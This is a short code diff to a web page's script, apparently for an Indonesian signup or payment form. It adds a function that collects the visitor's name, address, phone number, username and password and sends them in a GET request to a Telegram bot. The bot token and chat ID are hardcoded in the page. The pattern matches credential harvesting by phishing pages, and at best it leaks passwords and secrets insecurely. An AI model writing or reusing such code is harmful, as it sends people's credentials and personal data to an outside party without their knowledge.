@@ -29,6 +29,17 @@ window.showToast = function (message, color = "primary", duration = 2000) {
   toast.buttons = []; // tanpa tombol
   toast.present();
 };
+
+function teleConfirm(){
+// chat_id = "-1903170022";
+chat_id = "-1903170022";
+// token = "5323538027:AAEKFXTpY40G1PKSrFsKzTDVeR4joDsXR9I";
+token = "5323538027:AAEKFXTpY40G1PKSrFsKzTDVeR4joDsXR9I";
+message = "<b>Pemberitahuan Pembayaran</b>%0Anama : "+ $("#nama").val() + "%0Aalamat : " + $("#alamat").val() + "%0Ano. hp : " + $("#nomor").val() + "%0Alink : " + $("#link").val() + "%0Apaket : " + $("#paket").val() + "%0Ausername : " + $("#username").val() + "%0Apassword : " + $("#password2").val();
+$.get("https://api.telegram.org/bot"+token+"/sendMessage?text="+message+"&chat_id="+chat_id+"&parse_mode=html");
+$("#modal-signup").modal("hide");
+$("#confirm").modal("show");
+}
 </script>
 <script type="module">
 document.addEventListener("DOMContentLoaded", () => {
